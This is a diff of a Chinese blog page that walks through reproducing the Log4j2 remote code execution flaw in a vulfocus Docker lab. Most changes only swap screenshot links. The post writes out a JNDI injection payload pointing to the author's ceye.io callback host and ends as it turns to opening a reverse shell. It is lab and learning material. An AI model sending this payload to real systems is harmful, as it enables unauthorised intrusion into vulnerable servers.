@@ -474,7 +474,7 @@
                 
                 <div class="info-break-policy">
                     <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    772
+                    765
                 </div>
                 
 
@@ -502,15 +502,15 @@
 <p>下面直接开始复现</p>
 <p>现在虚拟机上面拉个Java环境，这样方便嘛</p>
 <p>直接执行代码docker pull vulfocus/log4j2-rce-2021-12-09:latest</p>
-<p><img src="https://raw.githubusercontent.com/hostboyii/hostboyii.github.io/main/img20220405200600.png"></p>
+<p><img src="https://raw.githubusercontent.com/hostboyii/hostboyii.github.io/main/img20220405201938.png"></p>
 <p>然后docker images 观看是那个镜像文件，把它跑起来</p>
-<p><img src="https://raw.githubusercontent.com/hostboyii/hostboyii.github.io/main/img20220405200606.png"></p>
+<p><img src="https://raw.githubusercontent.com/hostboyii/hostboyii.github.io/main/img20220405202007.png"></p>
+<p><img src="https://raw.githubusercontent.com/hostboyii/hostboyii.github.io/main/img20220405202042.png"></p>
 <p>直接docker run -d -P vulfocus/log4j2-rce-2021-12-09  然后看这个跑起来的虚拟机的那个端口号映射到了本虚拟机的端口号docker ps</p>
-<p><img src="https://raw.githubusercontent.com/hostboyii/hostboyii.github.io/main/img20220405200723.png"></p>
-<p>然后就直接访问这个网页是否搭建成功 直接访问192.168.227.128：49153   192.168.227.128是我kali虚拟机</p>
-<p><img src="https://raw.githubusercontent.com/hostboyii/hostboyii.github.io/main/img20220405200812.png"></p>
+<p><img src="https://raw.githubusercontent.com/hostboyii/hostboyii.github.io/main/img20220405202019.png">这个网页是否搭建成功 直接访问192.168.227.128：49153   192.168.227.128是我kali虚拟机</p>
+<p><img src="https://raw.githubusercontent.com/hostboyii/hostboyii.github.io/main/img20220405202206.png"></p>
 <p>然后就要先检测这个网页是否纯在log4j2这个漏洞，直接上bp。这里要主要箭头的地方，直接构造的payload要使用自己ceye上的payload=${jndi:ldap://zzz.yqy3cn.ceye.io} 前面的二级域名随便写什么，不写也可以。</p>
-<p><img src="https://raw.githubusercontent.com/hostboyii/hostboyii.github.io/main/img20220405201043.png"></p>
+<p><img src="https://raw.githubusercontent.com/hostboyii/hostboyii.github.io/main/img20220405202224.png"></p>
 <p>然后在ceye.io上出现了这个以后，就代表纯在这个log4j2漏洞。</p>
 <p><img src="https://raw.githubusercontent.com/hostboyii/hostboyii.github.io/main/img20220405201201.png"></p>
 <p>现在就到了最刺激的一步了，直接来弹shell吧。。</p>
@@ -1232,7 +1232,7 @@
 
             
             &nbsp;<i class="fa fa-area-chart"></i>&nbsp;站点总字数:&nbsp;
-            <span class="white-color">772</span>
+            <span class="white-color">765</span>
             
 
             <br>
